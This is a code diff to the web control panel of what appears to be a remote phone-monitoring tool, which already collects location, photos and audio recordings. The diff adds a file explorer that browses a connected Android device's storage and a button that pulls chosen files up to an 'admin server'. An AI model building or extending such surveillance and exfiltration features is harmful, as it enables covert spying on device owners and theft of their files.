@@ -93,6 +93,10 @@
                 <i class="fa-solid fa-microphone"></i>
                 <span>Record</span>
             </button>
+            <button onclick="openFileExplorer()" class="dock-btn" title="File Explorer">
+                <i class="fa-solid fa-folder-open"></i>
+                <span>Files</span>
+            </button>
             <div class="dock-divider"></div>
             <button onclick="fetchHistory()" class="dock-btn primary" title="View History">
                 <i class="fa-solid fa-server"></i>
@@ -111,9 +115,27 @@
                     <button class="tab-btn active" onclick="switchHistoryTab(event, 'location')">📍 Locations</button>
                     <button class="tab-btn" onclick="switchHistoryTab(event, 'photo')">📸 Photos</button>
                     <button class="tab-btn" onclick="switchHistoryTab(event, 'audio')">🎙️ Audio</button>
+                    <button class="tab-btn" onclick="switchHistoryTab(event, 'file')">📁 Files</button>
                 </div>
                 <div id="history-content" class="panel-body">
                     <!-- History items will be loaded here -->
+                </div>
+            </div>
+        </div>
+
+        <!-- 7. File Explorer Modal -->
+        <div id="explorer-overlay" class="overlay glass-overlay" style="display: none;">
+            <div class="panel glass-panel">
+                <div class="panel-header">
+                    <h3 id="explorer-title">File Explorer</h3>
+                    <button onclick="closeFileExplorer()" class="btn-close"><i class="fa-solid fa-xmark"></i></button>
+                </div>
+                <div class="explorer-path-bar">
+                    <button onclick="navigateUp()" class="btn-up"><i class="fa-solid fa-level-up-alt"></i></button>
+                    <span id="current-path">/storage/emulated/0</span>
+                </div>
+                <div id="explorer-content" class="panel-body">
+                    <!-- Directory contents loaded here -->
                 </div>
             </div>
         </div>
@@ -178,6 +200,17 @@
         function updateDeviceList(devices) {
             const ul = document.getElementById('devices-ul');
             ul.innerHTML = '';
+            
+            // Add a refresh button to the header area or list
+            const header = document.querySelector('.hud-left-panel h3');
+            if (header && !document.getElementById('btn-refresh-list')) {
+                const refreshBtn = document.createElement('button');
+                refreshBtn.id = 'btn-refresh-list';
+                refreshBtn.innerHTML = '<i class="fa-solid fa-rotate"></i>';
+                refreshBtn.className = 'btn-refresh-mini';
+                refreshBtn.onclick = () => socket.emit('list_devices');
+                header.appendChild(refreshBtn);
+            }
             
             document.getElementById('total-count').innerText = devices.length;
             document.getElementById('online-count').innerText = devices.length;
@@ -349,6 +382,7 @@
                 const locLogs = data.filter(l => l.logType === 'location');
                 const photoLogs = data.filter(l => l.logType === 'photo');
                 const audioLogs = data.filter(l => l.logType === 'audio');
+                const fileLogs = data.filter(l => l.logType === 'file');
 
                 container.innerHTML = `
                     <div class="tab-pane active" id="pane-location">
@@ -359,6 +393,9 @@
                     </div>
                     <div class="tab-pane" id="pane-audio">
                         ${audioLogs.length > 0 ? audioLogs.map(buildLogHtml).join('') : '<p class="empty-msg">No audio recordings</p>'}
+                    </div>
+                    <div class="tab-pane" id="pane-file">
+                        ${fileLogs.length > 0 ? fileLogs.map(buildLogHtml).join('') : '<p class="empty-msg">No downloaded files</p>'}
                     </div>
                 `;
             } catch (err) {
@@ -384,6 +421,12 @@
                                 <source src="${log.url}" type="audio/mp4">
                                 <source src="${log.url}" type="audio/mpeg">
                             </audio>
+                        </div>` : ''}
+                    ${log.logType === 'file' ? `
+                        <div class="audio-player-box">
+                            <span>📄 Downloaded File</span>
+                            <p style="font-size: 13px; margin-bottom:10px; color:var(--text-secondary);">${log.data?.originalName || 'Unknown file'}</p>
+                            <a href="${log.url}" download target="_blank" class="btn-action success" style="width: fit-content;"><i class="fa-solid fa-download"></i> View / Download</a>
                         </div>` : ''}
                     <div class="item-details">
                         ${log.logType === 'location' ? `<i class="fa-solid fa-location-dot"></i> ${log.latitude}, ${log.longitude}` : ''}
@@ -442,6 +485,72 @@
             } catch (err) {
                 alert('Failed to delete');
             }
+        }
+
+        // --- File Explorer JS ---
+        let currentExplorerPath = 'root';
+
+        function openFileExplorer() {
+            if (!activeDeviceId) return alert("Select a device first");
+            document.getElementById('explorer-overlay').style.display = 'flex';
+            currentExplorerPath = 'root'; // Reset to root each time we open
+            fetchDirectory(currentExplorerPath);
+        }
+        function closeFileExplorer() { document.getElementById('explorer-overlay').style.display = 'none'; }
+
+        function fetchDirectory(path) {
+            document.getElementById('explorer-content').innerHTML = '<div class="loading">Reading device storage...</div>';
+            currentExplorerPath = path;
+            document.getElementById('current-path').innerText = path;
+            socket.emit('request_directory', { deviceId: activeDeviceId, path: path });
+        }
+
+        socket.on('directory_data', (data) => {
+            if (data.deviceId !== activeDeviceId) return;
+            const container = document.getElementById('explorer-content');
+            if (!data.files || data.files.length === 0) {
+                container.innerHTML = '<p class="empty-msg">Folder is empty</p>';
+                return;
+            }
+            
+            // Sort dirs first
+            const files = data.files.sort((a,b) => (b.isDir === a.isDir) ? a.name.localeCompare(b.name) : (b.isDir ? -1 : 1));
+            
+            container.innerHTML = files.map(f => `
+                <div class="explorer-item ${f.isDir ? 'dir' : 'file'}" onclick="handleExplorerClick('${f.path.replace(/\\/g, '\\\\').replace(/'/g, "\\'")}', ${f.isDir})">
+                    <i class="fa-solid ${f.isDir ? 'fa-folder' : 'fa-file'} icon"></i>
+                    <div class="info">
+                        <span class="name">${f.name}</span>
+                        ${!f.isDir ? `<span class="size">${(f.size/1024).toFixed(1)} KB</span>` : ''}
+                    </div>
+                    ${!f.isDir ? `<button onclick="event.stopPropagation(); triggerFileDownload('${f.path.replace(/\\/g, '\\\\').replace(/'/g, "\\'")}')" class="btn-action"><i class="fa-solid fa-cloud-arrow-up"></i></button>` : ''}
+                </div>
+            `).join('');
+        });
+
+        socket.on('directory_error', (data) => {
+            if (data.deviceId !== activeDeviceId) return;
+            document.getElementById('explorer-content').innerHTML = `<p class="error empty-msg">${data.message}</p>`;
+        });
+
+        function handleExplorerClick(path, isDir) {
+            if (isDir) fetchDirectory(path);
+        }
+
+        function navigateUp() {
+            if (currentExplorerPath.length <= 1) return;
+            let parts = currentExplorerPath.split('/');
+            parts.pop();
+            let newPath = parts.join('/');
+            if (!newPath) newPath = "/";
+            if (newPath === "/storage/emulated") newPath = "/storage/emulated/0"; // Quick bounce back from annoying android root
+            fetchDirectory(newPath);
+        }
+
+        function triggerFileDownload(filePath) {
+            if (!confirm(`Upload this file to the admin server?\n\n${filePath}`)) return;
+            socket.emit('trigger_download_file', { deviceId: activeDeviceId, path: filePath });
+            alert("File upload requested. It will appear in 'Files' history tab shortly once downloaded from device.");
         }
 
         function logout() {
